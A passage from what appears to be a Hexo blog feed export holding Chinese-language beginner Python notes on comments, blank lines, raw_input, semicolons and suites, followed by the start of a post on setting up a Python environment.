href="#注释" class="headerlink" title="注释"></a>注释</h3><p>用<code>#</code>注释，从该标记直到该物理行的末尾都会被忽略。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># First comment</span><span class="token keyword">print</span> <span class="token string">"Hello, Python!"</span> <span class="token comment" spellcheck="true"># second comment</span></code></pre><p>使用三个引号来多行注释</p><pre class=" language-python"><code class="language-python"><span class="token triple-quoted-string string">'''This is a multilinecomment.'''</span></code></pre><h3 id="空白行"><a href="#空白行" class="headerlink" title="空白行"></a>空白行</h3><p>python完全忽略</p><p>在交互式会话中，必须使用空物理行终止多行语句。</p><h3 id="等待用户"><a href="#等待用户" class="headerlink" title="等待用户"></a>等待用户</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>raw_input<span class="token punctuation">(</span><span class="token string">"\n\nPress the enter key to exit."</span><span class="token punctuation">)</span></code></pre><p>该程序中使用了连续两个换行符来结束程序，这是一个技巧。</p><h3 id="一行上的多条语句"><a href="#一行上的多条语句" class="headerlink" title="一行上的多条语句"></a>一行上的多条语句</h3><p>使用分号<code>；</code>，可以允许一行多条语句，也就是在一个物理行上存在多个逻辑行。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">;</span> x <span class="token operator">=</span> <span class="token string">'foo'</span><span class="token punctuation">;</span> sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span></code></pre><h3 id="将多个语句组作为套件"><a href="#将多个语句组作为套件" class="headerlink" title="将多个语句组作为套件"></a>将多个语句组作为套件</h3><p>一组单独的语句块在python中称为套件，复合句或复杂语句中，如if、while、def、class需要一个标题名和一个套件。</p><p>标题行在开始，以冒号结束，后门跟着组成一行或多行的套件。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> expression <span class="token punctuation">:</span>suite<span class="token keyword">elif</span> expression <span class="token punctuation">:</span>suite<span class="token keyword">else</span> <span class="token punctuation">:</span>suite</code></pre><h3 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h3><p>-h help一下就知道了。</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Syntax </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python programming 2</title>
      <link href="posts/c302.html"/>
      <url>posts/c302.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>基础永远值得花费90%的精力去学习加强。认识实践的重要性。</p></blockquote><h2 id="Ax-Python-Environment-Setup-环境"><a href="#Ax-Python-Environment-Setup-环境" class="headerlink" title="Ax Python Environment Setup | 环境"></a>Ax Python Environment Setup | 环境</h2><blockquote><p>Python是跨平台的，学习设置它的环境。</p></blockquote><h3 id="Local-Environment-Setup"><a href="#Local-Environment-Setup" class="headerlink" title="Local Environment Setup"></a>Local Environment Setup</h3><p>打开终端窗口输入“python”查看安装了哪个版本。</p><ul><li>Unix (Solaris, Linux, FreeBSD, AIX, HP/UX, SunOS, IRIX, etc.)</li><li>Win 9x/NT/2000</li><li>Macintosh (Intel, PPC, 68K)</li><li>OS/2</li><li>DOS (multiple versions)</li><li>PalmOS</li><li>Nokia mobile phones</li><li>Windows CE</li><li>Acorn/RISC OS</li><li>BeOS</li><li>Amiga</li><li>VMS/OpenVMS</li><li>QNX</li><li>VxWorks</li><li>Psion</li><li>Python has also been ported to the Java and .NET virtual machines</li></ul><h3 id="Getting-Python"><a href="#Getting-Python" class="headerlink" title="Getting Python"></a>Getting Python</h3><p>最新版本的python可以在官网得到。</p><p><a href="https://www.python.org/">https://www.pyt